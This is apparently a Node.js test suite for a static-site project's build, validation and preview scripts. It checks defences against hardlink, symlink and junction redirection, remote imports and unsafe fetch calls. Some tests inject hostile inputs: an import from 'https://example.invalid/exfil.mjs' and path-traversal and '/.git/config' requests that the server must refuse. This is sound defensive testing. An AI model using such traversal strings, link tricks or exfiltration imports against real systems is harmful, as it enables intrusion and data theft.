import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdir, mkdtemp, readFile, writeFile, copyFile, link, symlink, unlink, rm, readdir, lstat, realpath, rename } from 'node:fs/promises';
import path from 'node:path';
import http from 'node:http';
import { ASSETS, PROJECT_ROOT, validateProject, inspectAssets, within, assertNodeVersion } from '../scripts/validation.mjs';
import { buildProject } from '../scripts/build.mjs';
import { startPreview, requestAsset } from '../scripts/serve.mjs';
import { buildAssets } from '../scripts/production.mjs';

const temporaryRoot = path.join(PROJECT_ROOT, 'test', '.tmp');
const comparable = (value) => process.platform === 'win32' ? value.toLowerCase() : value;
const samePath = (left, right) => comparable(path.resolve(left)) === comparable(path.resolve(right));
function requireFixture(condition) {
  if (!condition) throw new Error('UNSAFE_FIXTURE_DIRECTORY');
}
async function verifyDirectoryChain(workspace, directory) {
  workspace = path.resolve(workspace);
  directory = path.resolve(directory);
  requireFixture(samePath(workspace, directory) || within(workspace, directory));
  const relative = path.relative(workspace, directory);
  const paths = [workspace];
  let current = workspace;
  for (const part of relative === '' ? [] : relative.split(path.sep)) {
    current = path.join(current, part);
    paths.push(current);
  }
  const chain = [];
  for (const target of paths) {
    const stat = await lstat(target, { bigint: true });
    requireFixture(stat.isDirectory() && !stat.isSymbolicLink());
    const resolved = await realpath(target);
    requireFixture(samePath(resolved, target));
    chain.push({ path: target, resolved, dev: stat.dev, ino: stat.ino });
  }
  return chain;
}
async function prepareFixtureParent(workspace = PROJECT_ROOT) {
  workspace = path.resolve(workspace);
  await verifyDirectoryChain(workspace, workspace);
  let parent = workspace;
  for (const name of ['test', '.tmp']) {
    // Verify the existing parent before each possible mkdir; never recurse through a link.
    await verifyDirectoryChain(workspace, parent);
    const next = path.join(parent, name);
    try { await lstat(next); }
    catch (error) {
      if (error.code !== 'ENOENT') throw error;
      try { await mkdir(next); } catch (createError) { if (createError.code !== 'EEXIST') throw createError; }
    }
    await verifyDirectoryChain(workspace, next);
    parent = next;
  }
  const chain = await verifyDirectoryChain(workspace, parent);
  return { workspace, parent, resolvedParent: chain.at(-1).resolved, chain };
}
async function verifyFixtureParent(space) {
  const fresh = await verifyDirectoryChain(space.workspace, space.parent);
  requireFixture(fresh.length === space.chain.length && fresh.every((entry, index) =>
    samePath(entry.resolved, space.chain[index].resolved) && entry.dev === space.chain[index].dev && entry.ino === space.chain[index].ino));
  return fresh.at(-1).resolved;
}
async function createOwnedFixture(space, prefix = 'scaffold-') {
  requireFixture(/^[a-z][a-z0-9-]{0,40}-$/u.test(prefix));
  await verifyFixtureParent(space);
  const directory = await mkdtemp(path.join(space.parent, prefix));
  await verifyFixtureParent(space);
  const chain = await verifyDirectoryChain(space.workspace, directory);
  const identity = chain.at(-1);
  requireFixture(within(space.resolvedParent, identity.resolved) && !samePath(space.resolvedParent, identity.resolved));
  return { directory, identity };
}
async function verifyOwnedFixture(space, directory, identity) {
  await verifyFixtureParent(space);
  requireFixture(samePath(directory, identity.path) && within(space.parent, directory));
  const chain = await verifyDirectoryChain(space.workspace, directory);
  const target = chain.at(-1);
  requireFixture(within(space.resolvedParent, target.resolved) && !samePath(space.resolvedParent, target.resolved));
  requireFixture(samePath(target.resolved, identity.resolved) && target.dev === identity.dev && target.ino === identity.ino);
  return target.resolved;
}
async function removeOwnedFixture(space, directory, identity) {
  // Recheck physical containment, all parent identities and the task-owned target immediately before rm.
  const resolved = await verifyOwnedFixture(space, directory, identity);
  await rm(resolved, { recursive: true });
}
async function removeFixtureChild(space, directory, identity, relative) {
  const ownedRoot = await verifyOwnedFixture(space, directory, identity);
  const target = path.resolve(directory, relative);
  requireFixture(within(directory, target));
  const chain = await verifyDirectoryChain(space.workspace, target);
  const resolved = chain.at(-1).resolved;
  requireFixture(within(ownedRoot, resolved) && !samePath(ownedRoot, resolved));
  await verifyOwnedFixture(space, directory, identity);
  // A second chain read prevents using an earlier physical target after ancestor replacement.
  requireFixture(samePath((await verifyDirectoryChain(space.workspace, target)).at(-1).resolved, resolved));
  await rm(resolved, { recursive: true });
}
async function fixture(t) {
  const space = await prepareFixtureParent();
  requireFixture(samePath(space.parent, temporaryRoot));
  const { directory, identity } = await createOwnedFixture(space);
  t.after(async () => {
    await removeOwnedFixture(space, directory, identity);
  });
  const project = path.join(directory, 'project');
  const files = ['package.json', 'wrangler.jsonc', ...ASSETS.map((file) => 'public/' + file), ...['validation', 'check', 'build', 'serve', 'production', 'release'].map((file) => `scripts/${file}.mjs`)];
  for (const relative of files) {
    const destination = path.join(project, ...relative.split('/'));
    await mkdir(path.dirname(destination), { recursive: true });
    await copyFile(path.join(PROJECT_ROOT, ...relative.split('/')), destination);
  }
  return { directory, project, space, identity, removeChild: (relative) => removeFixtureChild(space, directory, identity, relative) };
}
function request(port, route, method = 'GET', headers = {}) {
  return new Promise((resolve, reject) => {
    const req = http.request({ host: '127.0.0.1', port, path: route, method, headers }, (res) => {
      let body = ''; res.setEncoding('utf8'); res.on('data', (chunk) => { body += chunk; });
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body }));
    });
    req.on('error', reject); req.end();
  });
}
const close = (server) => new Promise((resolve, reject) => server.close((error) => error ? reject(error) : resolve()));

test('Node 24 contract and self-contained preview validation', async () => {
  assert.throws(() => assertNodeVersion('23.9.0'), { message: 'NODE_24_REQUIRED' });
  assert.throws(() => assertNodeVersion('invalid'), { message: 'NODE_24_REQUIRED' });
  const result = await validateProject();
  assert.equal(result.status, 'PASS'); assert.equal(result.mode, 'preview');
  assert.equal(result.files.length, 8);
  assert.ok(result.files.every((file) => file.bytes > 0 && /^[0-9a-f]{64}$/u.test(file.sha256)));
});

test('build copies the complete allowlist deterministically and supports safe repeat builds', async (t) => {
  const { project } = await fixture(t);
  await buildProject(project);
  for (const file of ASSETS) assert.deepEqual(await readFile(path.join(project, 'dist', file)), await readFile(path.join(project, 'public', file)));
  const first = await readFile(path.join(project, 'dist/index.html'));
  await buildProject(project);
  assert.deepEqual(await readFile(path.join(project, 'dist/index.html')), first);
  assert.deepEqual(await inspectAssets(path.join(project, 'dist'), { assets: buildAssets('preview') }), [...buildAssets('preview')].sort());
});

test('unknown stale dist asset rejects before any output overwrite', async (t) => {
  const { project } = await fixture(t);
  await mkdir(path.join(project, 'dist'));
  await writeFile(path.join(project, 'dist/index.html'), 'KNOWN_OUTPUT_SENTINEL');
  await writeFile(path.join(project, 'dist/stale.txt'), 'UNKNOWN_SENTINEL');
  await assert.rejects(buildProject(project), { message: 'UNKNOWN_ASSET' });
  assert.equal(await readFile(path.join(project, 'dist/index.html'), 'utf8'), 'KNOWN_OUTPUT_SENTINEL');
  assert.equal(await readFile(path.join(project, 'dist/stale.txt'), 'utf8'), 'UNKNOWN_SENTINEL');
  assert.deepEqual((await readdir(path.join(project, 'dist'))).sort(), ['index.html', 'stale.txt']);
});

test('source and destination hardlinks fail safely without touching outside sentinels', async (t) => {
  for (const target of ['public', 'dist']) {
    await t.test(target, async (t) => {
      const { project, directory } = await fixture(t);
      const sentinel = path.join(directory, 'outside.txt');
      await writeFile(sentinel, 'OUTSIDE_SENTINEL');
      if (target === 'public') await unlink(path.join(project, 'public/index.html'));
      else await mkdir(path.join(project, 'dist'));
      await link(sentinel, path.join(project, target, 'index.html'));
      await assert.rejects(buildProject(project), { message: 'UNSAFE_FILE' });
      assert.equal(await readFile(sentinel, 'utf8'), 'OUTSIDE_SENTINEL');
      assert.equal(await readFile(path.join(project, target, 'index.html'), 'utf8'), 'OUTSIDE_SENTINEL');
    });
  }
});

test('source directory link and destination junction reject without writing through them', async (t) => {
  for (const target of ['public', 'dist']) {
    await t.test(target, async (t) => {
      const { project, directory, removeChild } = await fixture(t);
      const outside = path.join(directory, 'outside');
      await mkdir(outside); await writeFile(path.join(outside, 'sentinel.txt'), 'JUNCTION_SENTINEL');
      if (target === 'public') {
        await removeChild('project/public/en');
        await symlink(outside, path.join(project, 'public/en'), process.platform === 'win32' ? 'junction' : 'dir');
        await assert.rejects(buildProject(project), { message: 'UNSAFE_FILE' });
      } else {
        await symlink(outside, path.join(project, 'dist'), process.platform === 'win32' ? 'junction' : 'dir');
        await assert.rejects(buildProject(project), { message: 'UNSAFE_DIRECTORY' });
      }
      assert.equal(await readFile(path.join(outside, 'sentinel.txt'), 'utf8'), 'JUNCTION_SENTINEL');
      assert.deepEqual(await readdir(outside), ['sentinel.txt']);
    });
  }
});

test('RG-M1-R1: fixture writes reject a junction at test or test/.tmp before touching synthetic outside data', async (t) => {
  for (const linkedAncestor of ['test', 'test/.tmp']) {
    await t.test(linkedAncestor, async (t) => {
      const { directory } = await fixture(t);
      const workspace = path.join(directory, 'synthetic-workspace');
      const outside = path.join(directory, 'synthetic-outside');
      await mkdir(workspace);
      await mkdir(outside);
      await writeFile(path.join(outside, 'sentinel.txt'), 'PARENT_JUNCTION_SENTINEL');
      if (linkedAncestor === 'test/.tmp') await mkdir(path.join(workspace, 'test'));
      await symlink(outside, path.join(workspace, linkedAncestor), process.platform === 'win32' ? 'junction' : 'dir');
      await assert.rejects(prepareFixtureParent(workspace), { message: 'UNSAFE_FIXTURE_DIRECTORY' });
      assert.equal(await readFile(path.join(outside, 'sentinel.txt'), 'utf8'), 'PARENT_JUNCTION_SENTINEL');
      assert.deepEqual(await readdir(outside), ['sentinel.txt']);
    });
  }
});

test('RG-M1-R1: cleanup rechecks a replaced fixture parent and refuses the parent itself', async (t) => {
  const { directory, space: outerSpace, identity: outerIdentity } = await fixture(t);
  const workspace = path.join(directory, 'synthetic-workspace');
  await mkdir(workspace);
  const space = await prepareFixtureParent(workspace);
  const owned = await createOwnedFixture(space, 'owned-');
  await writeFile(path.join(owned.directory, 'inside.txt'), 'ORIGINAL_OWNED_FIXTURE');
  await assert.rejects(removeOwnedFixture(space, space.parent, owned.identity), { message: 'UNSAFE_FIXTURE_DIRECTORY' });
  await assert.rejects(removeFixtureChild(space, owned.directory, owned.identity, '.'), { message: 'UNSAFE_FIXTURE_DIRECTORY' });
  const outside = path.join(directory, 'synthetic-outside');
  const outsideChild = path.join(outside, path.basename(owned.directory));
  await mkdir(outside); await mkdir(outsideChild);
  await writeFile(path.join(outsideChild, 'sentinel.txt'), 'CLEANUP_JUNCTION_SENTINEL');
  const parked = path.join(workspace, 'test', 'parked-tmp');
  // Both absolute rename targets resolve inside this already verified, task-owned outer fixture.
  const outerRoot = await verifyOwnedFixture(outerSpace, directory, outerIdentity);
  const source = await verifyFixtureParent(space);
  const destinationParent = (await verifyDirectoryChain(workspace, path.dirname(parked))).at(-1).resolved;
  const destination = path.join(destinationParent, path.basename(parked));
  requireFixture(within(outerRoot, source) && within(outerRoot, destination) && samePath(destination, parked));
  await rename(source, destination);
  await symlink(outside, space.parent, process.platform === 'win32' ? 'junction' : 'dir');
  await assert.rejects(removeOwnedFixture(space, owned.directory, owned.identity), { message: 'UNSAFE_FIXTURE_DIRECTORY' });
  assert.equal(await readFile(path.join(outsideChild, 'sentinel.txt'), 'utf8'), 'CLEANUP_JUNCTION_SENTINEL');
  assert.deepEqual(await readdir(outsideChild), ['sentinel.txt']);
  assert.equal(await readFile(path.join(parked, path.basename(owned.directory), 'inside.txt'), 'utf8'), 'ORIGINAL_OWNED_FIXTURE');
});

test('check rejects unknown runtime assets, a broken import, indexing preview and external runtime calls', async (t) => {
  for (const scenario of ['unknown', 'import', 'indexing', 'external']) {
    await t.test(scenario, async (t) => {
      const { project } = await fixture(t);
      const app = path.join(project, 'public/js/app.mjs');
      if (scenario === 'unknown') await writeFile(path.join(project, 'public/private.txt'), 'FAKE_PRIVATE_NAME');
      if (scenario === 'import') await writeFile(app, (await readFile(app, 'utf8')).replace("'./i18n.mjs'", "'./missing.mjs'"));
      if (scenario === 'external') await writeFile(app, (await readFile(app, 'utf8')) + '\nfetch("https://example.invalid");\n');
      if (scenario === 'indexing') {
        const html = path.join(project, 'public/index.html');
        await writeFile(html, (await readFile(html, 'utf8')).replace('noindex,nofollow', 'index,follow'));
      }
      const expected = { unknown: 'UNKNOWN_ASSET', import: 'BROKEN_LOCAL_REFERENCE', indexing: 'PREVIEW_NOINDEX_REQUIRED', external: 'UNSAFE_RUNTIME_API' };
      await assert.rejects(validateProject(project), { message: expected[scenario] });
    });
  }
});

test('RG-M1-R1: check covers ordinary named and side-effect imports without contacting their targets', async (t) => {
  for (const [declaration, expectedCode] of [
    ['import "https://example.invalid/exfil.mjs";', 'INVALID_MODULE_REFERENCE'],
    ['import "./not-allowlisted.mjs";', 'BROKEN_LOCAL_REFERENCE'],
    ['import "i18n.mjs";', 'INVALID_MODULE_REFERENCE'],
    ['import { value } from "https://example.invalid/exfil.mjs";', 'INVALID_MODULE_REFERENCE'],
    ['import "./i18n.mjs";\nimport { messages as moreMessages } from "./i18n.mjs";', null]
  ]) {
    await t.test(expectedCode || 'valid local named and side-effect imports', async (t) => {
      const { project } = await fixture(t);
      const app = path.join(project, 'public/js/app.mjs');
      await writeFile(app, (await readFile(app, 'utf8')) + '\n' + declaration + '\n');
      if (expectedCode) await assert.rejects(validateProject(project), { message: expectedCode });
      else assert.equal((await validateProject(project)).status, 'PASS');
    });
  }
});

test('preview serves only loopback allowlisted GET/HEAD routes, MIME, and noindex headers', async (t) => {
  const { server, port } = await startPreview({ port: 0 });
  t.after(() => close(server));
  assert.equal(server.address().address, '127.0.0.1');
  for (const [route, mime] of [['/', 'text/html'], ['/en/index.html', 'text/html'], ['/js/app.mjs', 'text/javascript'], ['/styles/app.css', 'text/css'], ['/robots.txt', 'text/plain']]) {
    const response = await request(port, route);
    assert.equal(response.status, 200); assert.ok(response.headers['content-type'].startsWith(mime));
    assert.equal(response.headers['x-robots-tag'], 'noindex, nofollow');
    assert.equal(response.headers['cache-control'], 'no-store');
    assert.ok(response.headers['content-security-policy'].includes("connect-src 'none'"));
  }
  assert.equal((await request(port, '/en/')).status, 200);
  assert.equal((await request(port, '/index.html', 'HEAD')).body, '');
  assert.equal((await request(port, '/index.html', 'POST')).status, 405);
  assert.equal((await request(port, '/index.html', 'GET', { 'Content-Length': '1' })).status, 400);
  for (const route of ['/../package.json', '/%2e%2e/package.json', '/..%5cpackage.json', '/%2fpackage.json', '/.git/config', '/package.json', '/api', '/missing', '/%ZZ', '//index.html']) {
    assert.equal((await request(port, route)).status, 404);
  }
  assert.equal(requestAsset('/.hidden/index.html'), null);
  assert.equal(requestAsset('/en/%2e%2e/index.html'), null);
  assert.equal(requestAsset('/' + 'x'.repeat(4096)), null);
});

test('an occupied preview port obtains an OS-assigned port while preserving the existing server', async (t) => {
  const first = await startPreview({ port: 0 });
  t.after(() => close(first.server));
  const second = await startPreview({ port: first.port, fallbackOnConflict: true });
  t.after(() => close(second.server));
  assert.notEqual(first.port, second.port);
  assert.equal((await request(first.port, '/')).status, 200);
  assert.equal((await request(second.port, '/')).status, 200);
});
